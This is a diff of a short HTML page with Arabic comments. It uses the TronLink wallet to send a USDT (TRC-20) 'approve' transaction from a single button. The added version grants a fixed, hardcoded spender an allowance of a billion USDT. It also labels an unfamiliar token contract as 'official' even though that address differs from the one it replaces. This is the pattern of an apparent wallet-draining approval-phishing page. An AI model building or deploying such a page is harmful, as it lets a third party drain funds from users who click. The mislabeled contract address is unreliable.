@@ -1,42 +1,36 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>USDT Approve with TronLink</title>
+  <meta charset="UTF-8">
+  <title>Approve USDT (TRC20)</title>
 </head>
 <body>
-    <h1>Approve USDT on TRON with TronLink</h1>
-    <button onclick="approveUSDT()">Approve 1,000,000 USDT</button>
+  <h2>Approve USDT (TRC-20)</h2>
+  <button onclick="approveUSDT()">Approve USDT</button>
 
-    <script>
-        async function approveUSDT() {
-            try {
-                // التحقق من وجود TronLink
-                if (!window.tronWeb || !window.tronWeb.defaultAddress.base58) {
-                    alert('Please install TronLink and log in.');
-                    return;
-                }
+  <script>
+    const usdtContractAddress = "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj"; // عقد USDT الرسمي على TRON
+    const spenderAddress = "TQJw8P2QKvLoWk6JWv3mJdA34r8UvZcfWu"; // عنوان تجريبي
+    const approveAmount = "1000000000000000"; // 1,000,000,000 USDT (مع 6 أصفار عشرية)
 
-                const tronWeb = window.tronWeb;
-                const usdtContractAddress = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
-                const spenderAddress = 'SPENDER_ADDRESS'; // استبدل بعنوان العقد المفوض
-                const amount = 1000000 * 1000000; // 1,000,000 USDT
+    async function approveUSDT() {
+      if (!window.tronWeb || !window.tronWeb.ready) {
+        alert("يرجى تثبيت TronLink وتسجيل الدخول.");
+        return;
+      }
 
-                // إنشاء معاملة Approve
-                const contract = await tronWeb.contract().at(usdtContractAddress);
-                const tx = await contract.approve(spenderAddress, amount).send({
-                    feeLimit: 10000000,
-                    callValue: 0
-                });
-
-                alert(`Transaction sent! TxID: ${tx}`);
-                console.log('Transaction ID:', tx);
-            } catch (error) {
-                console.error('Error:', error);
-                alert('Failed to send transaction: ' + error.message);
-            }
-        }
-    </script>
+      try {
+        const contract = await window.tronWeb.contract().at(usdtContractAddress);
+        const tx = await contract.approve(spenderAddress, approveAmount).send({
+          feeLimit: 100_000_000
+        });
+        alert('تم إرسال المعاملة: ' + tx);
+        console.log('Transaction:', tx);
+      } catch (error) {
+        console.error(error);
+        alert('حدث خطأ: ' + error.message);
+      }
+    }
+  </script>
 </body>
 </html>
